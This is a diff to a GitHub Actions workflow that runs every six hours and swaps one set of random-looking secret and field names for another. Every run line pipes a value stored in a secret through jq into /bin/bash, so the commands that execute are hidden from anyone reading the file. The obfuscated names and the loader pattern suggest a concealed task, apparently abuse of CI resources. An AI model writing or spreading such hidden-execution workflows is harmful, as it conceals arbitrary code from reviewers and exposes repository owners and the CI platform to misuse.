@@ -3,20 +3,19 @@ name: dongyugang0987
 on:
   workflow_dispatch:
   schedule:
-    - cron: '38 0/6 * * *'
+    - cron: '52 4/6 * * *'
 jobs:
   build:
     runs-on: ubuntu-latest
-
     steps:
       - uses: actions/checkout@v4
       - name: dongyugang0987
         env:
-          r401: ${{ secrets.r401 }}
+          lgtn5: ${{ secrets.lgtn5 }}
         run: |
-          echo $r401 | jq -r .riiid465 | /bin/bash
-          echo $ckas926 | jq -r .tzs98235 | /bin/bash
-          echo $w63702 | jq -r .jolnh73 | /bin/bash
-          echo $ez2922 | jq -r .top256 | /bin/bash
-          echo $iga12 | jq -r .ikho188 | /bin/bash
+          echo $lgtn5 | jq -r .ux114 | /bin/bash
+          echo $kii1540 | jq -r .k3546 | /bin/bash
+          echo $a416 | jq -r .j42 | /bin/bash
+          echo $j40245 | jq -r .i7 | /bin/bash
+          echo $yi7028 | jq -r .p4 | /bin/bash
 
